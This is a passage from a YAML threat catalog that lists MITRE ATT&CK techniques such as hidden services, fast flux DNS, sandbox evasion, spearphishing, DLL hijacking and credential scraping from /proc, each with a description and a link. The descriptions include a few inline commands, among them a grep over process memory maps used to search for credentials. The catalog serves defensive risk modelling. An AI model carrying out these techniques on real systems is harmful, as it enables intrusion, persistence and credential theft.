      \ [Masquerade Task or Service](https://attack.mitre.org/techniques/T1036/004)\
      \ (ex: using a service and/or payload name related to a legitimate OS or benign\
      \ software component). Adversaries may also create \u2018hidden\u2019 services\
      \ (i.e., [Hide Artifacts](https://attack.mitre.org/techniques/T1564)), for example\
      \ by using the `sc sdset` command to set service permissions via the Service\
      \ Descriptor Definition Language (SDDL). This may hide a Windows service from\
      \ the view of standard service enumeration methods such as `Get-Service`, `sc\
      \ query`, and `services.exe`.(Citation: SANS 1)(Citation: SANS 2)\nhttps://attack.mitre.org/techniques/T1543/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1568.001
    ref_id: T1568.001
    name: Fast Flux DNS
    description: 'Adversaries may use Fast Flux DNS to hide a command and control
      channel behind an array of rapidly changing IP addresses linked to a single
      domain resolution. This technique uses a fully qualified domain name, with multiple
      IP addresses assigned to it which are swapped with high frequency, using a combination
      of round robin IP addressing and short Time-To-Live (TTL) for a DNS resource
      record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast
      Flux - Welivesecurity)


      The simplest, "single-flux" method, involves registering and de-registering
      an addresses as part of the DNS A (address) record list for a single DNS name.
      These registrations have a five-minute average lifespan, resulting in a constant
      shuffle of IP address resolution.(Citation: Fast Flux - Welivesecurity)


      In contrast, the "double-flux" method registers and de-registers an address
      as part of the DNS Name Server record list for the DNS zone, providing additional
      resilience for the connection. With double-flux additional hosts can act as
      a proxy to the C2 host, further insulating the true source of the C2 channel.

      https://attack.mitre.org/techniques/T1568/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1497.001
    ref_id: T1497.001
    name: System Checks
    description: "Adversaries may employ various system checks to detect and avoid\
      \ virtualization and analysis environments. This may include changing behaviors\
      \ based on the results of checks for the presence of artifacts indicative of\
      \ a virtual machine environment (VME) or sandbox. If the adversary detects a\
      \ VME, they may alter their malware to disengage from the victim or conceal\
      \ the core functions of the implant. They may also search for VME artifacts\
      \ before dropping secondary or additional payloads. Adversaries may use the\
      \ information learned from [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497)\
      \ during automated discovery to shape follow-on behaviors.(Citation: Deloitte\
      \ Environment Awareness)\n\nSpecific checks will vary based on the target and/or\
      \ adversary, but may involve behaviors such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047),\
      \ [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Information\
      \ Discovery](https://attack.mitre.org/techniques/T1082), and [Query Registry](https://attack.mitre.org/techniques/T1012)\
      \ to obtain system information and search for VME artifacts. Adversaries may\
      \ search for VME artifacts in memory, processes, file system, hardware, and/or\
      \ the Registry. Adversaries may use scripting to automate these checks  into\
      \ one script and then have the program exit if it determines the system to be\
      \ a virtual environment. \n\nChecks could include generic system properties\
      \ such as host/domain name and samples of network traffic. Adversaries may also\
      \ check the network adapters addresses, CPU core count, and available memory/drive\
      \ size. Once executed, malware may also use [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
      \ to check if it was saved in a folder or file with unexpected or even analysis-related\
      \ naming artifacts such as `malware`, `sample`, or `hash`.\n\nOther common checks\
      \ may enumerate services running that are unique to these applications, installed\
      \ programs on the system, manufacturer/product fields for strings relating to\
      \ virtual machine applications, and VME-specific hardware/processor instructions.(Citation:\
      \ McAfee Virtual Jan 2017) In applications like VMWare, adversaries can also\
      \ use a special I/O port to send commands and receive output. \n \nHardware\
      \ checks, such as the presence of the fan, temperature, and audio devices, could\
      \ also be used to gather evidence that can be indicative a virtual environment.\
      \ Adversaries may also query for specific readings from these devices.(Citation:\
      \ Unit 42 OilRig Sept 2018)\nhttps://attack.mitre.org/techniques/T1497/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1053.003
    ref_id: T1053.003
    name: Cron
    description: 'Adversaries may abuse the <code>cron</code> utility to perform task
      scheduling for initial or recurring execution of malicious code.(Citation: 20
      macOS Common Tools and Techniques) The <code>cron</code> utility is a time-based
      job scheduler for Unix-like operating systems.  The <code> crontab</code> file
      contains the schedule of cron entries to be run and the specified times for
      execution. Any <code>crontab</code> files are stored in operating system-specific
      file paths.


      An adversary may use <code>cron</code> in Linux or Unix environments to execute
      programs at system startup or on a scheduled basis for [Persistence](https://attack.mitre.org/tactics/TA0003).

      https://attack.mitre.org/techniques/T1053/003'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1069.002
    ref_id: T1069.002
    name: Domain Groups
    description: 'Adversaries may attempt to find domain-level groups and permission
      settings. The knowledge of domain-level permission groups can help adversaries
      determine which groups exist and which users belong to a particular group. Adversaries
      may use this information to determine which users have elevated permissions,
      such as domain administrators.


      Commands such as <code>net group /domain</code> of the [Net](https://attack.mitre.org/software/S0039)
      utility,  <code>dscacheutil -q group</code> on macOS, and <code>ldapsearch</code>
      on Linux can list domain-level groups.

      https://attack.mitre.org/techniques/T1069/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1588.006
    ref_id: T1588.006
    name: Vulnerabilities
    description: 'Adversaries may acquire information about vulnerabilities that can
      be used during targeting. A vulnerability is a weakness in computer hardware
      or software that can, potentially, be exploited by an adversary to cause unintended
      or unanticipated behavior to occur. Adversaries may find vulnerability information
      by searching open databases or gaining access to closed vulnerability databases.(Citation:
      National Vulnerability Database)


      An adversary may monitor vulnerability disclosures/databases to understand the
      state of existing, as well as newly discovered, vulnerabilities. There is usually
      a delay between when a vulnerability is discovered and when it is made public.
      An adversary may target the systems of those known to conduct vulnerability
      research (including commercial vendors). Knowledge of a vulnerability may cause
      an adversary to search for an existing exploit (i.e. [Exploits](https://attack.mitre.org/techniques/T1588/005))
      or to attempt to develop one themselves (i.e. [Exploits](https://attack.mitre.org/techniques/T1587/004)).

      https://attack.mitre.org/techniques/T1588/006'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.002
    ref_id: T1566.002
    name: Spearphishing Link
    description: "Adversaries may send spearphishing emails with a malicious link\
      \ in an attempt to gain access to victim systems. Spearphishing with a link\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of links to download malware contained\
      \ in email, instead of attaching malicious files to the email itself, to avoid\
      \ defenses that may inspect email attachments. Spearphishing may also involve\
      \ social engineering techniques, such as posing as a trusted source.\n\nAll\
      \ forms of spearphishing are electronically delivered social engineering targeted\
      \ at a specific individual, company, or industry. In this case, the malicious\
      \ emails contain links. Generally, the links will be accompanied by social engineering\
      \ text and require the user to actively click or copy and paste a URL into a\
      \ browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204).\
      \ The visited website may compromise the web browser using an exploit, or the\
      \ user will be prompted to download applications, documents, zip files, or even\
      \ executables depending on the pretext for the email in the first place.\n\n\
      Adversaries may also include links that are intended to interact directly with\
      \ an email reader, including embedded images intended to exploit the end system\
      \ directly. Additionally, adversaries may use seemingly benign links that abuse\
      \ special characters to mimic legitimate websites (known as an \"IDN homograph\
      \ attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking\
      \ advantage of quirks in the URL schema, such as the acceptance of integer-\
      \ or hexadecimal-based hostname formats and the automatic discarding of text\
      \ before an \u201C@\u201D symbol: for example, `hxxp://google.com@1157586937`.(Citation:\
      \ Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform\
      \ consent phishing, typically with OAuth 2.0 request URLs that when accepted\
      \ by the user provide permissions/access for malicious applications, allowing\
      \ adversaries to  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation:\
      \ Trend Micro Pawn Storm OAuth 2017) These stolen access tokens allow the adversary\
      \ to perform various actions on behalf of the user via API calls. (Citation:\
      \ Microsoft OAuth 2.0 Consent Phishing 2021)\n\nAdversaries may also utilize\
      \ spearphishing links to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s\
      \ that grant immediate access to the victim environment. For example, a user\
      \ may be lured through \u201Cconsent phishing\u201D into granting adversaries\
      \ permissions/access via a malicious OAuth 2.0 request URL .(Citation: Trend\
      \ Micro Pawn Storm OAuth 2017)(Citation: Microsoft OAuth 2.0 Consent Phishing\
      \ 2021)\n\nSimilarly, malicious links may also target device-based authorization,\
      \ such as OAuth 2.0 device authorization grant flow which is typically used\
      \ to authenticate devices without UIs/browsers. Known as \u201Cdevice code phishing,\u201D\
      \ an adversary may send a link that directs the victim to a malicious authorization\
      \ page where the user is tricked into entering a code/credentials that produces\
      \ a device token.(Citation: SecureWorks Device Code Phishing 2021)(Citation:\
      \ Netskope Device Code Phishing 2021)(Citation: Optiv Device Code Phishing 2021)\n\
      https://attack.mitre.org/techniques/T1566/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1070.002
    ref_id: T1070.002
    name: Clear Linux or Mac System Logs
    description: 'Adversaries may clear system logs to hide evidence of an intrusion.
      macOS and Linux both keep track of system or user-initiated actions via system
      logs. The majority of native system logging is stored under the <code>/var/log/</code>
      directory. Subfolders in this directory categorize logs by their related functions,
      such as:(Citation: Linux Logs)


      * <code>/var/log/messages:</code>: General and system-related messages

      * <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication
      logs

      * <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records

      * <code>/var/log/kern.log</code>: Kernel logs

      * <code>/var/log/cron.log</code>: Crond logs

      * <code>/var/log/maillog</code>: Mail server logs

      * <code>/var/log/httpd/</code>: Web server access and error logs

      https://attack.mitre.org/techniques/T1070/002'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1499.004
    ref_id: T1499.004
    name: Application or System Exploitation
    description: 'Adversaries may exploit software vulnerabilities that can cause
      an application or system to crash and deny availability to users. (Citation:
      Sucuri BIND9 August 2015) Some systems may automatically restart critical applications
      and services when crashes occur, but they can likely be re-exploited to cause
      a persistent denial of service (DoS) condition.


      Adversaries may exploit known or zero-day vulnerabilities to crash applications
      and/or systems, which may also lead to dependent applications and/or systems
      to be in a DoS condition. Crashed or restarted applications or systems may also
      have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485),
      [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489)
      etc. which may further cause a DoS condition and deny availability to critical
      information, applications and/or systems.

      https://attack.mitre.org/techniques/T1499/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1137
    ref_id: T1137
    name: Office Application Startup
    description: 'Adversaries may leverage Microsoft Office-based applications for
      persistence between startups. Microsoft Office is a fairly common application
      suite on Windows-based operating systems within an enterprise network. There
      are multiple mechanisms that can be used with Office for persistence when an
      Office-based application is started; this can include the use of Office Template
      Macros and add-ins.


      A variety of features have been discovered in Outlook that can be abused to
      obtain persistence, such as Outlook rules, forms, and Home Page.(Citation: SensePost
      Ruler GitHub) These persistence mechanisms can work within Outlook or be used
      through Office 365.(Citation: TechNet O365 Outlook Rules)

      https://attack.mitre.org/techniques/T1137'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1218.004
    ref_id: T1218.004
    name: InstallUtil
    description: 'Adversaries may use InstallUtil to proxy execution of code through
      a trusted Windows utility. InstallUtil is a command-line utility that allows
      for installation and uninstallation of resources by executing specific installer
      components specified in .NET binaries. (Citation: MSDN InstallUtil) The InstallUtil
      binary may also be digitally signed by Microsoft and located in the .NET directories
      on a Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code>
      and <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.


      InstallUtil may also be used to bypass application control through use of attributes
      within the binary that execute the class decorated with the attribute <code>[System.ComponentModel.RunInstaller(true)]</code>.
      (Citation: LOLBAS Installutil)

      https://attack.mitre.org/techniques/T1218/004'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1598.003
    ref_id: T1598.003
    name: Spearphishing Link
    description: "Adversaries may send spearphishing messages with a malicious link\
      \ to elicit sensitive information that can be used during targeting. Spearphishing\
      \ for information is an attempt to trick targets into divulging information,\
      \ frequently credentials or other actionable information. Spearphishing for\
      \ information frequently involves social engineering techniques, such as posing\
      \ as a source with a reason to collect information (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585)\
      \ or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) and/or\
      \ sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing\
      \ are electronically delivered social engineering targeted at a specific individual,\
      \ company, or industry. In this scenario, the malicious emails contain links\
      \ generally accompanied by social engineering text to coax the user to actively\
      \ click or copy and paste a URL into a browser.(Citation: TrendMictro Phishing)(Citation:\
      \ PCMag FakeLogin) The given website may be a clone of a legitimate site (such\
      \ as an online or corporate login portal) or may closely resemble a legitimate\
      \ site in appearance and have a URL containing elements from the real site.\
      \ URLs may also be obfuscated by taking advantage of quirks in the URL schema,\
      \ such as the acceptance of integer- or hexadecimal-based hostname formats and\
      \ the automatic discarding of text before an \u201C@\u201D symbol: for example,\
      \ `hxxp://google.com@1157586937`.(Citation: Mandiant URL Obfuscation 2023)\n\
      \nAdversaries may also embed \u201Ctracking pixels\u201D, \"web bugs\", or \"\
      web beacons\" within phishing messages to verify the receipt of an email, while\
      \ also potentially profiling and tracking victim information such as IP address.(Citation:\
      \ NIST Web Bug) (Citation: Ryte Wiki) These mechanisms often appear as small\
      \ images (typically one pixel in size) or otherwise obfuscated objects and are\
      \ typically delivered as HTML code containing a link to a remote server. (Citation:\
      \ Ryte Wiki)(Citation: IAPP)\n\nAdversaries may also be able to spoof a complete\
      \ website using what is known as a \"browser-in-the-browser\" (BitB) attack.\
      \ By generating a fake browser popup window with an HTML-based address bar that\
      \ appears to contain a legitimate URL (such as an authentication portal), they\
      \ may be able to prompt users to enter their credentials while bypassing typical\
      \ URL verification methods.(Citation: ZScaler BitB 2020)(Citation: Mr. D0x BitB\
      \ 2022)\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2`\
      \ to perform adversary-in-the-middle phishing by proxying the connection between\
      \ the victim and the legitimate website. On a successful login, the victim is\
      \ redirected to the legitimate website, while the adversary captures their session\
      \ cookie (i.e., [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539))\
      \ in addition to their username and password. This may enable the adversary\
      \ to then bypass MFA via [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004).(Citation:\
      \ Proofpoint Human Factor)\n\nAdversaries may also send a malicious link in\
      \ the form of Quick Response (QR) Codes (also known as \u201Cquishing\u201D\
      ). These links may direct a victim to a credential phishing page.(Citation:\
      \ QR-campaign-energy-firm) By using a QR code, the URL may not be exposed in\
      \ the email and may thus go undetected by most automated email security scans.(Citation:\
      \ qr-phish-agriculture) These QR codes may be scanned by or delivered directly\
      \  to a user\u2019s mobile device (i.e., [Phishing](https://attack.mitre.org/techniques/T1660)),\
      \ which may be less secure in several relevant ways.(Citation: qr-phish-agriculture)\
      \ For example, mobile users may not be able to notice minor differences between\
      \ genuine and credential harvesting websites due to mobile\u2019s smaller form\
      \ factor.\n\nFrom the fake website, information is gathered in web forms and\
      \ sent to the adversary. Adversaries may also use information from previous\
      \ reconnaissance efforts (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)\
      \ or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594))\
      \ to craft persuasive and believable lures.\nhttps://attack.mitre.org/techniques/T1598/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1021.004
    ref_id: T1021.004
    name: SSH
    description: "Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078)\
      \ to log into remote machines using Secure Shell (SSH). The adversary may then\
      \ perform actions as the logged-on user.\n\nSSH is a protocol that allows authorized\
      \ users to open remote shells on other computers. Many Linux and macOS versions\
      \ come with SSH installed by default, although typically disabled until the\
      \ user enables it. The SSH server can be configured to use standard password\
      \ authentication or public-private keypairs in lieu of or in addition to a password.\
      \ In this authentication scenario, the user\u2019s public key must be in a special\
      \ file on the computer running the server that lists which keypairs are allowed\
      \ to login as that user.\nhttps://attack.mitre.org/techniques/T1021/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1098.003
    ref_id: T1098.003
    name: Additional Cloud Roles
    description: "An adversary may add additional roles or permissions to an adversary-controlled\
      \ cloud account to maintain persistent access to a tenant. For example, adversaries\
      \ may update IAM policies in cloud-based environments or add a new global administrator\
      \ in Office 365 environments.(Citation: AWS IAM Policies and Permissions)(Citation:\
      \ Google Cloud IAM Policies)(Citation: Microsoft Support O365 Add Another Admin,\
      \ October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions,\
      \ a compromised account can gain almost unlimited access to data and settings\
      \ (including the ability to reset the passwords of other admins).(Citation:\
      \ Expel AWS Attacker)\n(Citation: Microsoft O365 Admin Roles) \n\nThis account\
      \ modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or other malicious account activity. Adversaries may also modify existing\
      \ [Valid Accounts](https://attack.mitre.org/techniques/T1078) that they have\
      \ compromised. This could lead to privilege escalation, particularly if the\
      \ roles added allow for lateral movement to additional accounts.\n\nFor example,\
      \ in AWS environments, an adversary with appropriate permissions may be able\
      \ to use the <code>CreatePolicyVersion</code> API to define a new version of\
      \ an IAM policy or the <code>AttachUserPolicy</code> API to attach an IAM policy\
      \ with additional or distinct permissions to a compromised user account.(Citation:\
      \ Rhino Security Labs AWS Privilege Escalation)\n\nIn some cases, adversaries\
      \ may add roles to adversary-controlled accounts outside the victim cloud tenant.\
      \ This allows these external accounts to perform actions inside the victim tenant\
      \ without requiring the adversary to [Create Account](https://attack.mitre.org/techniques/T1136)\
      \ or modify a victim-owned account.(Citation: Invictus IR DangerDev 2024)\n\
      https://attack.mitre.org/techniques/T1098/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1547.012
    ref_id: T1547.012
    name: Print Processors
    description: 'Adversaries may abuse print processors to run malicious DLLs during
      system boot for persistence and/or privilege escalation. Print processors are
      DLLs that are loaded by the print spooler service, `spoolsv.exe`, during boot.(Citation:
      Microsoft Intro Print Processors)


      Adversaries may abuse the print spooler service by adding print processors that
      load malicious DLLs at startup. A print processor can be installed through the
      <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code>
      enabled. Alternatively, a print processor can be registered to the print spooler
      service by adding the <code>HKLM\SYSTEM\\[CurrentControlSet or ControlSet001]\Control\Print\Environments\\[Windows
      architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code>
      Registry key that points to the DLL.


      For the malicious print processor to be correctly installed, the payload must
      be located in the dedicated system print-processor directory, that can be found
      with the <code>GetPrintProcessorDirectory</code> API call, or referenced via
      a relative path from this directory.(Citation: Microsoft AddPrintProcessor May
      2018) After the print processors are installed, the print spooler service, which
      starts during boot, must be restarted in order for them to run.(Citation: ESET
      PipeMon May 2020)


      The print spooler service runs under SYSTEM level permissions, therefore print
      processors installed by an adversary may run under elevated privileges.

      https://attack.mitre.org/techniques/T1547/012'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.001
    ref_id: T1566.001
    name: Spearphishing Attachment
    description: 'Adversaries may send spearphishing emails with a malicious attachment
      in an attempt to gain access to victim systems. Spearphishing attachment is
      a specific variant of spearphishing. Spearphishing attachment is different from
      other forms of spearphishing in that it employs the use of malware attached
      to an email. All forms of spearphishing are electronically delivered social
      engineering targeted at a specific individual, company, or industry. In this
      scenario, adversaries attach a file to the spearphishing email and usually rely
      upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation:
      Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering
      techniques, such as posing as a trusted source.


      There are many options for the attachment such as Microsoft Office documents,
      executables, PDFs, or archived files. Upon opening the attachment (and potentially
      clicking past protections), the adversary''s payload exploits a vulnerability
      or directly executes on the user''s system. The text of the spearphishing email
      usually tries to give a plausible reason why the file should be opened, and
      may explain how to bypass system protections in order to do so. The email may
      also contain instructions on how to decrypt an attachment, such as a zip file
      password, in order to evade email boundary defenses. Adversaries frequently
      manipulate file extensions and icons in order to make attached executables appear
      to be document files, or files exploiting one application appear to be a file
      for a different one.

      https://attack.mitre.org/techniques/T1566/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1027.008
    ref_id: T1027.008
    name: Stripped Payloads
    description: "Adversaries may attempt to make a payload difficult to analyze by\
      \ removing symbols, strings, and other human readable information. Scripts and\
      \ executables may contain variables names and other strings that help developers\
      \ document code functionality. Symbols are often created by an operating system\u2019\
      s `linker` when executable payloads are compiled. Reverse engineers use these\
      \ symbols and strings to analyze code and to identify functionality in payloads.(Citation:\
      \ Mandiant golang stripped binaries explanation)(Citation: intezer stripped\
      \ binaries elf files 2018)\n\nAdversaries may use stripped payloads in order\
      \ to make malware analysis more difficult. For example, compilers and other\
      \ tools may provide features to remove or obfuscate strings and symbols. Adversaries\
      \ have also used stripped payload formats, such as run-only AppleScripts, a\
      \ compiled and stripped version of [AppleScript](https://attack.mitre.org/techniques/T1059/002),\
      \ to evade detection and analysis. The lack of human-readable information may\
      \ directly hinder detection and analysis of payloads.(Citation: SentinelLabs\
      \ reversing run-only applescripts 2021)\nhttps://attack.mitre.org/techniques/T1027/008"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1559.001
    ref_id: T1559.001
    name: Component Object Model
    description: 'Adversaries may use the Windows Component Object Model (COM) for
      local code execution. COM is an inter-process communication (IPC) component
      of the native Windows application programming interface (API) that enables interaction
      between software objects, or executable code that implements one or more interfaces.(Citation:
      Fireeye Hunting COM June 2019) Through COM, a client object can call methods
      of server objects, which are typically binary Dynamic Link Libraries (DLL) or
      executables (EXE).(Citation: Microsoft COM) Remote COM execution is facilitated
      by [Remote Services](https://attack.mitre.org/techniques/T1021) such as  [Distributed
      Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation:
      Fireeye Hunting COM June 2019)


      Various COM interfaces are exposed that can be abused to invoke arbitrary execution
      via a variety of programming languages such as C, C++, Java, and [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation:
      Microsoft COM) Specific COM objects also exist to directly perform functions
      beyond code execution, such as creating a [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053),
      fileless download/execution, and other adversary behaviors related to privilege
      escalation and persistence.(Citation: Fireeye Hunting COM June 2019)(Citation:
      ProjectZero File Write EoP Apr 2018)

      https://attack.mitre.org/techniques/T1559/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1574.001
    ref_id: T1574.001
    name: DLL Search Order Hijacking
    description: 'Adversaries may execute their own malicious payloads by hijacking
      the search order used to load DLLs. Windows systems use a common method to look
      for required DLLs to load into a program. (Citation: Microsoft Dynamic Link
      Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads
      may be for the purpose of establishing persistence as well as elevating privileges
      and/or evading restrictions on file execution.


      There are many ways an adversary can hijack DLL loads. Adversaries may plant
      trojan dynamic-link library files (DLLs) in a directory that will be searched
      before the location of a legitimate library that will be requested by a program,
      causing Windows to load their malicious library when it is called for by the
      victim program. Adversaries may also perform DLL preloading, also called binary
      planting attacks, (Citation: OWASP Binary Planting) by placing a malicious DLL
      with the same name as an ambiguously specified DLL in a location that Windows
      searches before the legitimate DLL. Often this location is the current working
      directory of the program.(Citation: FireEye fxsst June 2011) Remote DLL preloading
      attacks occur when a program sets its current directory to a remote location
      such as a Web share before loading a DLL. (Citation: Microsoft Security Advisory
      2269637)


      Phantom DLL hijacking is a specific type of DLL search order hijacking where
      adversaries target references to non-existent DLL files.(Citation: Hexacorn
      DLL Hijacking)(Citation: Adversaries Hijack DLLs) They may be able to load their
      own malicious DLL by planting it with the correct name in the location of the
      missing module.


      Adversaries may also directly modify the search order via DLL redirection, which
      after being enabled (in the Registry and creation of a redirection file) may
      cause a program to load a different DLL.(Citation: Microsoft Dynamic-Link Library
      Redirection)(Citation: Microsoft Manifests)(Citation: FireEye DLL Search Order
      Hijacking)


      If a search order-vulnerable program is configured to run at a higher privilege
      level, then the adversary-controlled DLL that is loaded will also be executed
      at the higher level. In this case, the technique could be used for privilege
      escalation from user to administrator or SYSTEM or from administrator to SYSTEM,
      depending on the program. Programs that fall victim to path hijacking may appear
      to behave normally because malicious DLLs may be configured to also load the
      legitimate DLLs they were meant to replace.

      https://attack.mitre.org/techniques/T1574/001'
  - urn: urn:intuitem:risk:threat:mitre-attack:t1119
    ref_id: T1119
    name: Automated Collection
    description: "Once established within a system or network, an adversary may use\
      \ automated techniques for collecting internal data. Methods for performing\
      \ this technique could include use of a [Command and Scripting Interpreter](https://attack.mitre.org/techniques/T1059)\
      \ to search for and copy information fitting set criteria such as file type,\
      \ location, or name at specific time intervals. \n\nIn cloud-based environments,\
      \ adversaries may also use cloud APIs, data pipelines, command line interfaces,\
      \ or extract, transform, and load (ETL) services to automatically collect data.(Citation:\
      \ Mandiant UNC3944 SMS Phishing 2023) \n\nThis functionality could also be built\
      \ into remote access tools. \n\nThis technique may incorporate use of other\
      \ techniques such as [File and Directory Discovery](https://attack.mitre.org/techniques/T1083)\
      \ and [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) to\
      \ identify and move files, as well as [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538)\
      \ and [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619)\
      \ to identify resources in cloud environments.\nhttps://attack.mitre.org/techniques/T1119"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1115
    ref_id: T1115
    name: Clipboard Data
    description: "Adversaries may collect data stored in the clipboard from users\
      \ copying information within or between applications. \n\nFor example, on Windows\
      \ adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>.(Citation:\
      \ MSDN Clipboard)(Citation: clip_win_server)(Citation: CISA_AA21_200B) Additionally,\
      \ adversaries may monitor then replace users\u2019 clipboard with their data\
      \ (e.g., [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002)).(Citation:\
      \ mining_ruby_reversinglabs)\n\nmacOS and Linux also have commands, such as\
      \ <code>pbpaste</code>, to grab clipboard contents.(Citation: Operating with\
      \ EmPyre)\nhttps://attack.mitre.org/techniques/T1115"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1003.007
    ref_id: T1003.007
    name: Proc Filesystem
    description: "Adversaries may gather credentials from the proc filesystem or `/proc`.\
      \ The proc filesystem is a pseudo-filesystem used as an interface to kernel\
      \ data structures for Linux based systems managing virtual memory. For each\
      \ process, the `/proc/<PID>/maps` file shows how memory is mapped within the\
      \ process\u2019s virtual address space. And `/proc/<PID>/mem`, exposed for debugging\
      \ purposes, provides access to the process\u2019s virtual address space.(Citation:\
      \ Picus Labs Proc cump 2022)(Citation: baeldung Linux proc map 2022)\n\nWhen\
      \ executing with root privileges, adversaries can search these memory locations\
      \ for all processes on a system that contain patterns indicative of credentials.\
      \ Adversaries may use regex patterns, such as <code>grep -E \"^[0-9a-f-]* r\"\
      \ /proc/\"$pid\"/maps | cut -d' ' -f 1</code>, to look for fixed strings in\
      \ memory structures or cached hashes.(Citation: atomic-red proc file system)\
      \ When running without privileged access, processes can still view their own\
      \ virtual memory locations. Some services or programs may save credentials in\
      \ clear text inside the process\u2019s memory.(Citation: MimiPenguin GitHub\
      \ May 2017)(Citation: Polop Linux PrivEsc Gitbook)\n\nIf running as or with\
      \ the permissions of a web browser, a process can search the `/maps` & `/mem`\
      \ locations for common website credential patterns (that can also be used to\
      \ find adjacent memory within the same structure) in which hashes or cleartext\
      \ credentials may be located.\nhttps://attack.mitre.org/techniques/T1003/007"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1583.005
    ref_id: T1583.005
    name: Botnet
    description: "Adversaries may buy, lease, or rent a network of compromised systems\_\
      that can be used during targeting. A botnet is a network of compromised systems\
      \ that can be instructed to perform coordinated tasks.(Citation: Norton Botnet)\
      \ Adversaries may purchase a subscription to use an existing botnet from a booter/stresser\
      \ service. With a botnet at their disposal, adversaries may perform follow-on\
      \ activity such as large-scale [Phishing](https://attack.mitre.org/techniques/T1566)\
      \ or Distributed Denial of Service (DDoS).(Citation: Imperva DDoS for Hire)(Citation:\
      \ Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter)\nhttps://attack.mitre.org/techniques/T1583/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1555.005
    ref_id: T1555.005
    name: Password Managers
    description: "Adversaries may acquire user credentials from third-party password\
      \ managers.(Citation: ise Password Manager February 2019) Password managers\
      \ are applications designed to store user credentials, normally in an encrypted\
      \ database. Credentials are typically accessible after a user provides a master\
      \ password that unlocks the database. After the database is unlocked, these\
      \ credentials may be copied to memory. These databases can be stored as files\
      \ on disk.(Citation: ise Password Manager February 2019)\n\nAdversaries may\
      \ acquire user credentials from password managers by extracting the master password\
      \ and/or plain-text credentials from memory.(Citation: FoxIT Wocao December\
      \ 2019)(Citation: Github KeeThief) Adversaries may extract credentials from\
      \ memory via [Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212).(Citation:\
      \ NVD CVE-2019-3610)\n Adversaries may also try brute forcing via [Password\
      \ Guessing](https://attack.mitre.org/techniques/T1110/001) to obtain the master\
      \ password of a password manager.(Citation: Cyberreason Anchor December 2019)\n\
      https://attack.mitre.org/techniques/T1555/005"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1553.001
    ref_id: T1553.001
    name: Gatekeeper Bypass
    description: "Adversaries may modify file attributes and subvert Gatekeeper functionality\
      \ to evade user prompts and execute untrusted programs. Gatekeeper is a set\
      \ of technologies that act as layer of Apple\u2019s security model to ensure\
      \ only trusted applications are executed on a host. Gatekeeper was built on\
      \ top of File Quarantine in Snow Leopard (10.6, 2009) and has grown to include\
      \ Code Signing, security policy compliance, Notarization, and more. Gatekeeper\
      \ also treats applications running for the first time differently than reopened\
      \ applications.(Citation: TheEclecticLightCompany Quarantine and the flag)(Citation:\
      \ TheEclecticLightCompany apple notarization )\n\nBased on an opt-in system,\
